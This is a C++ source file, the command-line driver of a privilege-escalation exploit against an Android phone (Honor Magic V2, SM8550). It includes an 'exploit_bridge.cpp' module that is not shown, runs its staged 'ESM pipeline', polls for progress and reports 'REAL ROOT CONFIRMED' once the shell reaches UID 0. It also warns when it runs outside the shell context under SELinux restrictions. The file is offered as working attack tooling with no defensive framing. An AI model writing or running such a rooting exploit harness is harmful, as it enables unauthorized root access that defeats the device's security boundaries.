#include "exploit_bridge.cpp"
#include <chrono>
#include <iostream>
#include <thread>

// Minimal console-based telemetry for CLI
extern "C" {
// Override or hook into esm_log if needed, but exploit_bridge.cpp already uses
// android_log and a buffer. We'll just tail the buffer or rely on Logcat for
// now, but better to print to stdout.
}

int main(int argc, char **argv) {
  std::cout << "Sovereign Guard Native CLI v8.21" << std::endl;
  std::cout << "Target: Honor Magic V2 (SM8550)" << std::endl;
  std::cout << "Context: UID " << getuid() << " / EUID " << geteuid()
            << std::endl;
  std::cout << "------------------------------------------------" << std::endl;

  if (getuid() != 2000) {
    std::cerr << "!! WARNING: Not running in shell (UID 2000) context."
              << std::endl;
    std::cerr << "!! Results may be restricted by SELinux untrusted_app domain."
              << std::endl;
  }

  // Initialize global state
  std::cout << "[*] Calling esm_init_global()..." << std::endl;
  esm_init_global();
  std::cout << "[*] g_esm address: " << &g_esm << std::endl;

  // Start the pipeline
  std::cout << "[*] Starting ESM Pipeline (esm_run_pipeline)..." << std::endl;
  esm_run_pipeline();

  // Final verification loop
  int timeout = 30; // seconds
  while (timeout-- > 0) {
    int stage = (int)g_esm.state.stage;
    std::cout << "\r[+] Progress: Stage " << stage << "/7 ["
              << stage_names[stage] << "]... " << std::flush;

    if (stage >= 6 && g_esm.state.uid_after == 0) {
      std::cout << "\n\n★ ★ ★ REAL ROOT CONFIRMED ★ ★ ★" << std::endl;
      std::cout << "[!] Shell context elevated to UID 0." << std::endl;
      return 0;
    }

    if (stage < 0) { // Error handling if implemented
      std::cerr << "\n[!] Pipeline FAILED." << std::endl;
      return 1;
    }

    std::this_thread::sleep_for(std::chrono::seconds(1));
  }

  std::cout << "\n[!] Pipeline timed out or failed to reach Stage 6."
            << std::endl;
  return 1;
}
